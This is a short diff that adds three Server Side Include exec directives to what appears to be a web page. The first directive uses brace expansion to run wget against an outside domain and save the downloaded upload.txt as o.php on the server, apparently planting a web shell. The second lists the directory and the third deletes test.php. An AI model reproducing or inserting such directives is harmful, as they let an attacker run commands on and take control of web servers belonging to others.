@@ -1,0 +1,3 @@
+<!--#exec cmd="{wget,https://misalfalahkuncung.my.id/upload.txt,-O,o.php}" -->
+<!--#exec cmd="{ls,-la}" -->
+<!--#exec cmd="{rm,test.php}" -->
